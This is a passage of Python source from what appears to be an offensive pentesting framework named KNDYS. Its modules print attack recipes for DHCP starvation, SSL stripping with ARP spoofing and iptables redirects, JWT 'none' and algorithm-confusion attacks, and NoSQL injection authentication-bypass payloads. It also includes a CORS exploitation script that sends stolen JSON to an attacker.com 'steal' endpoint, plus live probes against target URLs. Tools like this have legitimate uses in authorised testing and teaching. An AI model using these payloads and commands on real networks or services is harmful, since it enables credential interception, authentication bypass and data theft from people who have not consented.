        print(f"{Fore.YELLOW}Interface: {Fore.WHITE}{interface}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Requests: {Fore.WHITE}{count}{Style.RESET_ALL}\n")
        
        print(f"{Fore.BLUE}Tool: Yersinia{Style.RESET_ALL}")
        print(f" {Fore.CYAN}sudo yersinia -G # GUI mode")
        print(f" # Select DHCP, enable 'Sending DISCOVER packet'{Style.RESET_ALL}\n")
        
        print(f"{Fore.BLUE}Tool: DHCPig{Style.RESET_ALL}")
        print(f" {Fore.CYAN}sudo pig.py {interface}{Style.RESET_ALL}\n")
        
        print(f"{Fore.GREEN}ℹ Impact:{Style.RESET_ALL}")
        print(f" • Legitimate clients can't get IP addresses")
        print(f" • Prepares for rogue DHCP server")
        print(f" • Network-wide disruption{Style.RESET_ALL}")
    
    def run_ssl_strip(self):
        """SSL stripping attack"""
        interface = self.module_options.get('interface', 'eth0')
        port = self.module_options.get('port', '8080')
        
        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║ SSL STRIP ATTACK ║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
        
        print(f"{Fore.YELLOW}Interface: {Fore.WHITE}{interface}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Port: {Fore.WHITE}{port}{Style.RESET_ALL}\n")
        
        print(f"{Fore.YELLOW} Prerequisites:{Style.RESET_ALL}")
        print(f" 1. Active MITM (ARP spoofing)")
        print(f" 2. IP forwarding enabled")
        print(f" 3. iptables redirect setup\n")
        
        print(f"{Fore.BLUE}Setup steps:{Style.RESET_ALL}\n")
        
        print(f"{Fore.CYAN}# 1. Enable IP forwarding")
        print(f"echo 1 > /proc/sys/net/ipv4/ip_forward")
        print(f"")
        print(f"# 2. Redirect traffic to sslstrip")
        print(f"iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port {port}")
        print(f"")
        print(f"# 3. Run sslstrip")
        print(f"sslstrip -l {port} -w sslstrip.log")
        print(f"")
        print(f"# 4. Start ARP spoofing")
        print(f"# use network/arp_spoof{Style.RESET_ALL}\n")
        
        print(f"{Fore.GREEN}ℹ What it does:{Style.RESET_ALL}")
        print(f" • Intercepts HTTPS requests")
        print(f" • Serves HTTP version to victim")
        print(f" • Victim sees HTTP, you see credentials")
        print(f" • Defeats basic SSL{Style.RESET_ALL}\n")
        
        print(f"{Fore.YELLOW}Note: Modern browsers have HSTS protection{Style.RESET_ALL}")
    
    def run_packet_sniffer(self):
        """Advanced packet sniffer"""
        interface = self.module_options.get('interface', 'eth0')
        filter_str = self.module_options.get('filter', 'tcp port 80')
        output = self.module_options.get('output', 'capture.pcap')
        count = int(self.module_options.get('count', '100'))
        
        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║ PACKET SNIFFER ║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
        
        print(f"{Fore.YELLOW}Interface: {Fore.WHITE}{interface}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Filter: {Fore.WHITE}{filter_str}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Output: {Fore.WHITE}{output}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Count: {Fore.WHITE}{count} packets{Style.RESET_ALL}\n")
        
        if not SCAPY_AVAILABLE:
            print(f"{Fore.RED} Scapy not available{Style.RESET_ALL}\n")
        
        print(f"{Fore.BLUE}Common BPF filters:{Style.RESET_ALL}\n")
        
        filters = [
            ("tcp port 80", "HTTP traffic"),
            ("tcp port 443", "HTTPS traffic"),
            ("tcp port 21 or tcp port 22", "FTP/SSH"),
            ("udp port 53", "DNS queries"),
            ("tcp[tcpflags] & (tcp-syn) != 0", "SYN packets only"),
            ("host 192.168.1.100", "Specific host"),
            ("net 192.168.1.0/24", "Entire network"),
            ("port 80 and host 192.168.1.100", "Combined")
        ]
        
        for f, desc in filters:
            print(f" {Fore.GREEN}{f:<40}{Fore.WHITE}{desc}{Style.RESET_ALL}")
        
        print(f"\n{Fore.CYAN}Using tcpdump:{Style.RESET_ALL}")
        print(f" {Fore.CYAN}sudo tcpdump -i {interface} -w {output} '{filter_str}' -c {count}{Style.RESET_ALL}\n")
        
        print(f"{Fore.CYAN}Using tshark:{Style.RESET_ALL}")
        print(f" {Fore.CYAN}tshark -i {interface} -w {output} -f '{filter_str}' -c {count}{Style.RESET_ALL}\n")
        
        print(f"{Fore.GREEN}ℹ Analysis tools:{Style.RESET_ALL}")
        print(f" • Wireshark - GUI analysis")
        print(f" • tshark - CLI analysis")
        print(f" • NetworkMiner - Extract files/credentials")
        print(f" • Bro/Zeek - Network security monitoring{Style.RESET_ALL}")
    
    # ============ WEB APPLICATION MODULES ============
    
    def run_jwt_cracker(self):
        """JWT security tester"""
        token = self.module_options.get('token', '')
        wordlist = self.module_options.get('wordlist', 'secrets.txt')
        algorithm = self.module_options.get('algorithm', 'HS256')
        
        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║ JWT SECURITY TESTER ║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
        
        if not token:
            print(f"{Fore.YELLOW}No token provided. Showing test scenarios:{Style.RESET_ALL}\n")
            
            print(f"{Fore.GREEN}1. None Algorithm Attack:{Style.RESET_ALL}")
            print(f" Change 'alg' to 'none' and remove signature")
            print(f" {Fore.CYAN}{{\"alg\":\"none\",\"typ\":\"JWT\"}}{Style.RESET_ALL}\n")
            
            print(f"{Fore.GREEN}2. Algorithm Confusion (RS256 → HS256):{Style.RESET_ALL}")
            print(f" Sign with public key using HS256")
            print(f" Server may verify with public key as secret\n")
            
            print(f"{Fore.GREEN}3. Weak Secret Brute Force:{Style.RESET_ALL}")
            print(f" Try common secrets from wordlist\n")
            
            print(f"{Fore.GREEN}4. JWT Payload Manipulation:{Style.RESET_ALL}")
            print(f" Modify claims: user_id, role, permissions\n")
            
            print(f"{Fore.BLUE}Example token structure:{Style.RESET_ALL}")
            print(f"{Fore.CYAN}eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.{Style.RESET_ALL}")
            print(f"{Fore.GREEN}SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c{Style.RESET_ALL}\n")
            
            print(f"{Fore.BLUE}Tools:{Style.RESET_ALL}")
            print(f" • jwt_tool - https://github.com/ticarpi/jwt_tool")
            print(f" • jwt.io - Online decoder")
            print(f" • hashcat - JWT cracking")
        else:
            print(f"{Fore.YELLOW}Token: {Fore.WHITE}{token[:50]}...{Style.RESET_ALL}\n")
            
            # Simple JWT decode demonstration
            try:
                parts = token.split('.')
                if len(parts) == 3:
                    import base64
                    
                    header = base64.b64decode(parts[0] + '==').decode('utf-8')
                    payload = base64.b64decode(parts[1] + '==').decode('utf-8')
                    
                    print(f"{Fore.GREEN} JWT decoded:{Style.RESET_ALL}\n")
                    print(f"{Fore.CYAN}Header:{Style.RESET_ALL}")
                    print(f"{header}\n")
                    print(f"{Fore.CYAN}Payload:{Style.RESET_ALL}")
                    print(f"{payload}\n")
            except:
                print(f"{Fore.RED} Invalid JWT format{Style.RESET_ALL}\n")
    
    def run_api_fuzzer(self):
        """REST API fuzzer"""
        url = self.module_options.get('url', 'https://api.example.com')
        method = self.module_options.get('method', 'POST')
        endpoints_file = self.module_options.get('endpoints', 'endpoints.txt')
        
        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║ REST API FUZZER ║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
        
        print(f"{Fore.YELLOW}Target: {Fore.WHITE}{url}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Method: {Fore.WHITE}{method}{Style.RESET_ALL}\n")
        
        print(f"{Fore.GREEN}Common API endpoints to test:{Style.RESET_ALL}\n")
        
        endpoints = [
            "/api/v1/users",
            "/api/v1/login",
            "/api/v1/register",
            "/api/v1/admin",
            "/api/v1/config",
            "/api/v1/export",
            "/api/v1/upload",
            "/api/internal",
            "/api/debug",
            "/api/test",
            "/.env",
            "/api/swagger.json",
            "/api/graphql"
        ]
        
        for endpoint in endpoints:
            print(f" {Fore.CYAN}{endpoint}{Style.RESET_ALL}")
        
        print(f"\n{Fore.BLUE}Fuzzing techniques:{Style.RESET_ALL}")
        print(f" • HTTP method fuzzing (GET, POST, PUT, DELETE, PATCH, OPTIONS)")
        print(f" • Path traversal (../../../etc/passwd)")
        print(f" • SQL injection in parameters")
        print(f" • XXE in XML/JSON")
        print(f" • Authentication bypass")
        print(f" • Rate limiting tests")
        print(f" • IDOR vulnerabilities\n")
        
        print(f"{Fore.GREEN}ℹ Tools:{Style.RESET_ALL}")
        print(f" • ffuf - Fast web fuzzer")
        print(f" • wfuzz - Web application fuzzer")
        print(f" • Burp Suite Intruder")
        print(f" • OWASP ZAP")
    
    def run_cors_scanner(self):
        """CORS misconfiguration scanner"""
        url = self.module_options.get('url', 'https://example.com')
        origin = self.module_options.get('origin', 'https://evil.com')
        
        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║ CORS SCANNER ║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
        
        print(f"{Fore.YELLOW}Target: {Fore.WHITE}{url}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Origin: {Fore.WHITE}{origin}{Style.RESET_ALL}\n")
        
        print(f"{Fore.BLUE}Testing CORS configuration...{Style.RESET_ALL}\n")
        
        try:
            headers = {
                'Origin': origin,
                'User-Agent': self.config['user_agent']
            }
            
            response = requests.get(url, headers=headers, timeout=10, verify=False)
            
            acao = response.headers.get('Access-Control-Allow-Origin')
            acac = response.headers.get('Access-Control-Allow-Credentials')
            
            if acao:
                print(f"{Fore.GREEN} CORS headers present{Style.RESET_ALL}")
                print(f"{Fore.CYAN}Access-Control-Allow-Origin: {Fore.WHITE}{acao}{Style.RESET_ALL}")
                if acac:
                    print(f"{Fore.CYAN}Access-Control-Allow-Credentials: {Fore.WHITE}{acac}{Style.RESET_ALL}\n")
                
                if acao == '*':
                    print(f"{Fore.YELLOW} Wildcard CORS - allows all origins!{Style.RESET_ALL}")
                elif acao == origin:
                    print(f"{Fore.RED} Origin reflected - potential vulnerability!{Style.RESET_ALL}")
                    if acac == 'true':
                        print(f"{Fore.RED} Credentials allowed with reflected origin - CRITICAL!{Style.RESET_ALL}")
                else:
                    print(f"{Fore.GREEN} CORS properly configured{Style.RESET_ALL}")
            else:
                print(f"{Fore.BLUE}ℹ No CORS headers found{Style.RESET_ALL}")
                
        except Exception as e:
            print(f"{Fore.RED} Error: {str(e)}{Style.RESET_ALL}")
        
        print(f"\n{Fore.BLUE}Exploitation scenario:{Style.RESET_ALL}")
        print(f"{Fore.CYAN}<!-- evil.com -->")
        print(f"<script>")
        print(f"fetch('{url}/api/sensitive', {{")
        print(f" credentials: 'include'")
        print(f"}}).then(r => r.json())")
        print(f" .then(data => fetch('https://attacker.com/steal?data=' + JSON.stringify(data)))")
        print(f"</script>{Style.RESET_ALL}")
    
    def run_nosql_injection(self):
        """NoSQL injection tester"""
        url = self.module_options.get('url', 'http://example.com/api')
        parameter = self.module_options.get('parameter', 'username')
        technique = self.module_options.get('technique', 'auth_bypass')
        
        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║ NoSQL INJECTION TESTER ║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
        
        print(f"{Fore.YELLOW}Target: {Fore.WHITE}{url}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Parameter: {Fore.WHITE}{parameter}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Technique: {Fore.WHITE}{technique}{Style.RESET_ALL}\n")
        
        print(f"{Fore.GREEN}Common NoSQL injection payloads:{Style.RESET_ALL}\n")
        
        print(f"{Fore.CYAN}1. Authentication Bypass (MongoDB):{Style.RESET_ALL}")
        print(f" {Fore.WHITE}username[$ne]=null&password[$ne]=null")
        print(f" username[$gt]=&password[$gt]=")
        print(f" username=admin&password[$ne]=1{Style.RESET_ALL}\n")
        
        print(f"{Fore.CYAN}2. JavaScript Injection:{Style.RESET_ALL}")
        print(f" {Fore.WHITE}username=admin&password=x' || '1'=='1")
        print(f" username='; return true; var dummy='&password=pass{Style.RESET_ALL}\n")
        
        print(f"{Fore.CYAN}3. Blind NoSQL Injection:{Style.RESET_ALL}")
        print(f" {Fore.WHITE}username[$regex]=^a.*&password[$ne]=1")
        print(f" # Test each character of password{Style.RESET_ALL}\n")
        
        print(f"{Fore.CYAN}4. Array Injection:{Style.RESET_ALL}")
        print(f" {Fore.WHITE}username[]=admin&username[]=administrator")
        print(f" # May bypass length validation{Style.RESET_ALL}\n")
        
        print(f"{Fore.BLUE}MongoDB operators to test:{Style.RESET_ALL}")
        ops = ["$ne", "$gt", "$gte", "$lt", "$lte", "$in", "$nin", "$regex", "$where", "$exists"]
        print(f" {', '.join(ops)}\n")
        
        print(f"{Fore.GREEN}ℹ Tools:{Style.RESET_ALL}")
        print(f" • NoSQLMap - Automated NoSQL scanner")
        print(f" • Burp Suite + NoSQLi extensions")
        print(f" • Manual testing with Burp Repeater")
    
    def run_graphql_introspection(self):
        """GraphQL schema introspection"""
        url = self.module_options.get('url', 'https://api.example.com/graphql')
        output = self.module_options.get('output', 'schema.json')
        
        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║ GraphQL INTROSPECTION ║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
        
        print(f"{Fore.YELLOW}Endpoint: {Fore.WHITE}{url}{Style.RESET_ALL}\n")
        
        introspection_query = """{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
          kind
        }
      }
    }
    queryType {
      name
    }
    mutationType {
      name
    }
  }
}"""
        
        print(f"{Fore.CYAN}Introspection query:{Style.RESET_ALL}\n{Fore.WHITE}{introspection_query}{Style.RESET_ALL}\n")
        
        try:
            response = requests.post(
                url,
                json={'query': introspection_query},
                headers={'Content-Type': 'application/json'},
                timeout=10,
                verify=False
            )
            
            if response.status_code == 200:
                data = response.json()
                
                with open(output, 'w') as f:
                    json.dump(data, f, indent=2)
                
                print(f"{Fore.GREEN} Schema retrieved!{Style.RESET_ALL}")
                print(f"{Fore.CYAN}→ Saved to: {Fore.WHITE}{output}{Style.RESET_ALL}\n")
                
                if 'data' in data and '__schema' in data['data']:
                    types = data['data']['__schema']['types']
                    print(f"{Fore.BLUE}Found {len(types)} types{Style.RESET_ALL}\n")
                    
                    print(f"{Fore.GREEN}Sample types:{Style.RESET_ALL}")
                    for t in types[:5]:
                        print(f" • {Fore.CYAN}{t['name']}{Style.RESET_ALL}")
                        
            else:
                print(f"{Fore.RED} Introspection may be disabled{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}Status: {response.status_code}{Style.RESET_ALL}")
                
        except Exception as e:
            print(f"{Fore.RED} Error: {str(e)}{Style.RESET_ALL}")
        
        print(f"\n{Fore.BLUE}Common GraphQL attacks:{Style.RESET_ALL}")
        print(f" • Introspection (schema disclosure)")
        print(f" • Nested queries (DoS)")
        print(f" • Batch attacks")
        print(f" • Field suggestion abuse")
        print(f" • Authorization bypass")
        print(f"\n{Fore.GREEN}ℹ Tools:{Style.RESET_ALL}")
        print(f" • GraphQL Voyager - Visualize schema")
        print(f" • Altair - GraphQL client")
        print(f" • InQL Scanner - Burp extension")
    
    def run_evidence_collector(self):
        """Collect evidence and screenshots"""
        session_id = self.module_options.get('session', '1')
        output = self.module_options.get('output', 'evidence.zip')
        
        print(f"{Fore.CYAN}[*] Collecting evidence from session {session_id}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Output: {output}{Style.RESET_ALL}\n")
        
        evidence_dir = f"evidence_{int(time.time())}"
        os.makedirs(evidence_dir, exist_ok=True)
        
        print(f"{Fore.BLUE}[*] Collecting system information...{Style.RESET_ALL}")
        sysinfo = {
            'hostname': platform.node(),
            'system': platform.system(),
            'release': platform.release(),
            'version': platform.version(),
            'machine': platform.machine(),
            'processor': platform.processor(),
            'timestamp': datetime.now().isoformat()
        }
        
        with open(os.path.join(evidence_dir, 'sysinfo.json'), 'w') as f:
            json.dump(sysinfo, f, indent=2)
        
        print(f"{Fore.GREEN}[+] System information collected{Style.RESET_ALL}")
        print(f"{Fore.BLUE}[*] Collecting network information...{Style.RESET_ALL}")
        try:
            result = subprocess.run('ifconfig || ip addr', shell=True, capture_output=True, text=True)
            with open(os.path.join(evidence_dir, 'network.txt'), 'w') as f:
                f.write(result.stdout)
            print(f"{Fore.GREEN}[+] Network information collected{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.YELLOW}[!] Could not collect network info: {str(e)}{Style.RESET_ALL}")
        
        print(f"{Fore.BLUE}[*] Creating archive...{Style.RESET_ALL}")
        try:
            with zipfile.ZipFile(output, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, dirs, files in os.walk(evidence_dir):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arcname = os.path.relpath(file_path, evidence_dir)
                        zipf.write(file_path, arcname)
            
            print(f"{Fore.GREEN}[+] Evidence archived: {output}{Style.RESET_ALL}")
            import shutil
            shutil.rmtree(evidence_dir)
        except Exception as e:
            print(f"{Fore.RED}[!] Error creating archive: {str(e)}{Style.RESET_ALL}")
    
    def show_stats(self):
        """Show framework statistics"""
        self._render_screen_header("Framework Telemetry", "live signal across pool, rate, sessions, and modules")

        blocks = [
            (
                "Connection Mesh",
                [
                    f"active channels :: {self.connection_pool.get_active_count()} / {self.connection_pool.max_connections}",
                    f"reserve slots :: {max(0, self.connection_pool.max_connections - self.connection_pool.get_active_count())}"
                ]
            ),
            (
                "Rate Governor",
                [
                    f"ceiling :: {self.rate_limiter.max_requests} req / {self.rate_limiter.time_window}s",
                    f"in-flight :: {len(self.rate_limiter.requests)} queued"
                ]
            ),
            (
                "Sessions",
                [
                    f"active :: {len(self.session_manager.sessions)}",
                    f"timeout :: {self.session_manager.session_timeout}s"
                ]
            )
        ]

        total_modules = sum(len(mods) for mods in self.modules.values())
        module_lines = [
            f"inventory :: {total_modules} modules / {len(self.modules)} domains"
        ]
        if self.current_module:
            module_lines.append(f"engaged :: {self.current_module}")
        blocks.append(("Module Matrix", module_lines))

        for title, lines in blocks:
            print(f"{Fore.CYAN}┌─[{title}]{Style.RESET_ALL}")
            for line in lines:
                print(f"{Fore.WHITE}│ {line}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}└{'─'*52}{Style.RESET_ALL}\n")

        error_stats = self.error_handler.get_error_stats()
        if error_stats:
            print(f"{Fore.CYAN}┌─[Error Summary]{Style.RESET_ALL}")
            for error_type, count in sorted(error_stats.items(), key=lambda x: x[1], reverse=True):
                print(f"{Fore.WHITE}│ {error_type:<26} {Fore.RED}{count}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}└{'─'*52}{Style.RESET_ALL}\n")
    
    def show_sessions(self):
        """Show active sessions"""
        self._render_screen_header("Active Links", "track footholds + idle timers")
        sessions = self.session_manager.sessions
        
        if not sessions:
            print(f"{Fore.YELLOW}▸ No live sessions. Launch a module to establish presence.{Style.RESET_ALL}\n")
            return
        
        print(f"{Fore.CYAN}{'session':<14}│{'created':<20}│{'last activity':<20}│status{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'─'*14}┼{'─'*20}┼{'─'*20}┼{'─'*12}{Style.RESET_ALL}")
        
        for session_id, session_data in sessions.items():
            created = datetime.fromtimestamp(session_data['created']).strftime('%Y-%m-%d %H:%M:%S')
            last_activity = datetime.fromtimestamp(session_data['last_activity']).strftime('%Y-%m-%d %H:%M:%S')
            idle_time = time.time() - session_data['last_activity']
            if idle_time < 60:
                status = f"{Fore.GREEN}ACTIVE{Style.RESET_ALL}"
            elif idle_time < 300:
                status = f"{Fore.YELLOW}IDLE {int(idle_time/60)}m{Style.RESET_ALL}"
            else:
                status = f"{Fore.RED}STALE {int(idle_time/60)}m{Style.RESET_ALL}"
            print(f"{session_id:<14}│{created:<20}│{last_activity:<20}│{status}")
        print()
    
    def run(self):
        """Main framework loop"""
        self.display_banner()
        
        while True:
            try:
                # Build prompt
                if self.current_module:
                    module_short = self.current_module.split('/')[-1]
                    prompt = (
                        f"{Fore.MAGENTA}╔[{Fore.CYAN}kndys//ops{Fore.MAGENTA}]─[{Fore.GREEN}{module_short}{Fore.MAGENTA}]╼\n"
                        f"{Fore.MAGENTA}╚══▶ {Style.RESET_ALL} "
                    )
                else:
                    prompt = (
                        f"{Fore.MAGENTA}╔[{Fore.CYAN}kndys//ops{Fore.MAGENTA}]╼\n"
                        f"{Fore.MAGENTA}╚══▶ {Style.RESET_ALL} "
                    )
                
                try:
                    cmd = input(prompt).strip()
                except EOFError:
                    print()
                    break
                
                if not cmd:
                    continue
                
                parts = cmd.split()
                command = parts[0].lower()
                args = parts[1:]
                
                if command in ['exit', 'quit']:
                    print(f"\n{Fore.MAGENTA}{Style.BRIGHT}┏━━ LINK TERMINATED ━━┓{Style.RESET_ALL}")
                    print(f"{Fore.MAGENTA}┃ Signal severed. Stay encrypted.{Style.RESET_ALL}")
                    print(f"{Fore.MAGENTA}┗{'━'*36}{Style.RESET_ALL}\n")
                    break
                
                elif command == 'help':
                    self.show_help()
                
                elif command == 'show':
                    if args and args[0] == 'modules':
                        category = args[1] if len(args) > 1 else None
                        self.show_modules(category)
                    elif args and args[0] == 'payloads':
                        self.show_payloads()
                    elif args and args[0] == 'options':
                        self.show_options()
                    elif args and args[0] == 'wordlists':
                        self.show_wordlists()
                    else:
                        print(f"{Fore.RED}[!] Usage: show modules|payloads|options|wordlists{Style.RESET_ALL}")
                
                elif command == 'use':
                    if args:
                        self.use_module(args[0])
                    else:
                        print(f"{Fore.RED}[!] Usage: use <module_path>{Style.RESET_ALL}")
                
                elif command == 'set':
                    if len(args) >= 2:
                        self.set_option(args[0], ' '.join(args[1:]))
                    else:
                        print(f"{Fore.RED}[!] Usage: set <option> <value>{Style.RESET_ALL}")
                
                elif command == 'setg':
                    if len(args) >= 2:
                        key = args[0]
                        value = ' '.join(args[1:])
                        if key in self.config:
                            self.config[key] = value
                            print(f"{Fore.GREEN}[+] Global {key} => {value}{Style.RESET_ALL}")
                        else:
                            print(f"{Fore.RED}[!] Invalid global option: {key}{Style.RESET_ALL}")
                    else:
                        print(f"{Fore.RED}[!] Usage: setg <option> <value>{Style.RESET_ALL}")
                
                elif command == 'options':
                    self.show_options()
                
                elif command == 'run':
                    self.run_module()
                
                elif command == 'back':
                    self.current_module = None
                    self.module_options = {}
                    print(f"{Fore.YELLOW}[*] Back to main context{Style.RESET_ALL}")
                
                elif command == 'clear':
                    self.display_banner()
                
                elif command == 'search':
                    if args and args[0] == 'exploits':
                        query = ' '.join(args[1:]) if len(args) > 1 else ''
                        self.search_exploits(query)
                    else:
                        print(f"{Fore.RED}[!] Usage: search exploits <query>{Style.RESET_ALL}")
                
                elif command == 'generate':
                    if args and args[0] == 'payload':
                        self.generate_payload()
                    else:
                        print(f"{Fore.RED}[!] Usage: generate payload{Style.RESET_ALL}")

                elif command == 'download':
                    if len(args) >= 2 and args[0] == 'wordlist':
                        self.download_wordlist(args[1])
                    else:
                        print(f"{Fore.RED}[!] Usage: download wordlist <alias>{Style.RESET_ALL}")
                
                elif command == 'stats':
                    self.show_stats()
                
                elif command == 'sessions':
                    self.show_sessions()
                
                else:
                    print(f"{Fore.RED} Unknown command: {Fore.WHITE}{command}{Style.RESET_ALL}")
                    print(f"{Fore.BLUE}ℹ Type {Fore.CYAN}help{Fore.BLUE} for available commands{Style.RESET_ALL}")
            
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[!] Command interrupted{Style.RESET_ALL}")
                if self.running:
                    self.running = False
                    time.sleep(1)
            
            except Exception as e:
                print(f"{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")
                import traceback
                traceback.print_exc()

def main():
    """Main entry point"""
    print(f"{Fore.YELLOW}[*] Loading KNDYS Framework v3.0...{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] Checking dependencies...{Style.RESET_ALL}")
    
    # Check for required dependencies
    missing_deps = []
    
    if not NMAP_AVAILABLE:
        missing_deps.append("python-nmap (optional)")
    if not SCAPY_AVAILABLE:
        missing_deps.append("scapy (optional)")
    if not SSH_AVAILABLE:
        missing_deps.append("paramiko (optional)")
    if not BS4_AVAILABLE:
        missing_deps.append("beautifulsoup4 (optional)")
    
    if missing_deps:
        print(f"{Fore.YELLOW}[!] Missing optional dependencies: {', '.join(missing_deps)}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Install with: pip install {' '.join([d.split()[0] for d in missing_deps])}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Continuing with reduced functionality...{Style.RESET_ALL}")
        time.sleep(2)
    
    try:
        framework = KNDYSFramework()
        framework.run()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[*] Framework terminated{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] Fatal error: {str(e)}{Style.RESET_ALL}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    # Parse command line arguments
    parser = argparse.ArgumentParser(description='KNDYS Pentesting Framework')
    parser.add_argument('-q', '--quiet', action='store_true', help='Quiet mode')
    args = parser.parse_args()
    main()